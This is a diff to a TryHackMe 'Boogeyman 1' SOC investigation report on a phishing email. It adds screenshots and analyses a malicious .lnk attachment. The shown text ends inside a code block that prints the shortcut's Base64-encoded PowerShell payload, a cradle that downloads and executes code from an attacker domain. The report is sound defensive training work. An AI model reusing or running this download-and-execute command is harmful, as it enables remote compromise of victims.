@@ -1,3 +1,4 @@
+
 # TryHackMe: Boogeyman 1 — SOC Investigation Report
 
 > **Room:** [TryHackMe — Boogeyman 1](https://tryhackme.com/room/boogeyman1)  
@@ -58,6 +59,9 @@ I reviewed the sender information and raw email headers in `dump.eml`. This iden
 
 ### Evidence
 
+<img width="933" height="684" alt="Screenshot 2026-10-01 at 15 46 11" src="https://github.com/user-attachments/assets/fdec0623-8548-4d5b-9a15-d40de72d7f14" />
+
+
 ```text
 From: agriffin@bpakcaging.xyz
 ```
@@ -82,6 +86,9 @@ I reviewed the recipient field to identify the targeted employee and correlate t
 
 ### Evidence
 
+<img width="933" height="684" alt="Screenshot 2026-10-01 at 15 46 11" src="https://github.com/user-attachments/assets/fdec0623-8548-4d5b-9a15-d40de72d7f14" />
+
+
 ```text
 To: julianne.westcott@hotmail.com
 ```
@@ -103,6 +110,18 @@ julianne.westcott@hotmail.com
 ### Investigation Direction
 
 I examined the raw email headers rather than relying only on the visible sender address. DKIM and List-Unsubscribe headers can reveal the mail-delivery platform used to send a phishing campaign.
+
+### Steps Taken
+
+View > Message Source > Search for key word 'DKIM-Signature'
+
+<img width="515" height="464" alt="Screenshot 2026-10-01 at 15 46 45" src="https://github.com/user-attachments/assets/f9d11964-d829-4fae-a63a-86986a3e49cf" />
+
+
+<img width="1020" height="844" alt="Screenshot 2026-10-01 at 15 47 23" src="https://github.com/user-attachments/assets/5c18b6fc-b304-4d47-9a9f-91baca2ed0dc" />
+
+
+<img width="1237" height="718" alt="Screenshot 2026-10-01 at 15 48 01" src="https://github.com/user-attachments/assets/8e88bc45-da0c-4ebf-bb7a-4555b8b97353" />
 
 ### Evidence
 
@@ -158,6 +177,8 @@ Invoice_20230103.lnk
 
 I reviewed the phishing email body for archive-opening instructions. Password-protected attachments are often used to bypass email security controls because encrypted contents cannot be easily scanned.
 
+<img width="933" height="684" alt="Screenshot 2026-10-01 at 15 46 12" src="https://github.com/user-attachments/assets/f9b26102-c14b-4aad-9ae4-fb157d05d817" />
+
 ### Correct Answer
 
 ```text
@@ -187,6 +208,8 @@ lnkparse Invoice_20230103.lnk
 ### Evidence
 
 The shortcut contained this Base64-encoded PowerShell payload:
+
+<img width="1555" height="1047" alt="Screenshot 2026-10-01 at 15 50 59" src="https://github.com/user-attachments/assets/2a874386-5083-40ce-994e-158fd1256c3d" />
 
 ```text
 aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
